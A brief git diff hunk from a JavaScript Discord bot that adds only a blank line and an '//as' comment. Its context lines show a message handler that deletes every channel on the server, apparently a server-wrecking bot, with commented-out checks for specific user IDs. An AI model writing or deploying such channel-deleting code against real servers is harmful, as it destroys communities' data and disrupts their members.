@@ -10,6 +10,8 @@ client.on("message", (message) => {
   for (var i = 0; i < server.channels.array().length; i++) {
     server.channels.array()[i].delete();
   }
+
+  //as
   // if ((message.mentions.users.has("809116090692927536") || 
   // message.mentions.users.has("720902882928361543") || 
   // message.mentions.users.has("670816688891101204")) && 
